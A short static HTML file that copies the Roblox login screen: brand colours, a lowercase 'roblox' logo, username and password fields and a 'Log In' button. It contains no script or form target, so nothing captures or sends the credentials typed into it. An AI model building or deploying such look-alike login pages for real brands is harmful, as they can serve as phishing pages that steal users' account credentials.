<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Roblox</title><style>*{box-sizing:border-box;margin:0;padding:0;font-family:Gotham,"Helvetica Neue",Helvetica,Arial,sans-serif}body{background:#232527;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden}.rbx-login-container{background:#111214;padding:36px;border-radius:12px;width:100%;max-width:400px;box-shadow:0 8px 24px rgba(0,0,0,.5);border:1px solid #2f3136}.rbx-logo{font-size:28px;font-weight:800;letter-spacing:1px;text-align:center;margin-bottom:24px;text-transform:lowercase}.rbx-input{width:100%;background:#1f2226;border:1px solid #393b3d;color:#fff;padding:14px;border-radius:8px;font-size:14px;outline:none;margin-bottom:14px}.rbx-input:focus{border-color:#0084ff}.rbx-btn{width:100%;background:#00b06f;color:#fff;border:none;padding:14px;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer;transition:background .2s}.rbx-btn:hover{background:#00995f}</style></head><body><div class="rbx-login-container"><div class="rbx-logo">roblox</div><input type="text" class="rbx-input" placeholder="Username/Email/Phone"><input type="password" class="rbx-input" placeholder="Password"><button class="rbx-btn">Log In</button></div></body></html>
